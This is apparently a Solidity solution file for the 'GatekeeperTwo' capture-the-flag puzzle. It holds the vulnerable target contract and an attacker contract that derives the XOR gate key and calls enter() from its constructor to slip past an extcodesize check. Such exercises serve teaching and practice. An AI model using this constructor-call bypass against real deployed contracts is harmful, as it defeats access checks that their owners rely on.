// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "Must go through another sender");
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0, "assembly code size failed");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        console.log(uint64(0) - 1);
        console.log(uint64(0));
        console.log(uint64(-1));
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1,
            "Gate three failed"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

interface IGateKeeper {
    function enter(bytes8 _gateKey) external returns (bool);

    function enter_gateOne(bytes8 _gateKey) external returns (bool);

    function enter_gateTwo(bytes8 _gateKey) external returns (bool);

    function enter_gateThree(bytes8 _gateKey) external returns (bool);
}

contract GateTwoAttacker {
    constructor(address targetGate) public {
        IGateKeeper gatekeeper = IGateKeeper(targetGate);
        // bytes8 data = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));
        bytes8 data = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1  ) ) ;
        gatekeeper.enter(data);
    }
}
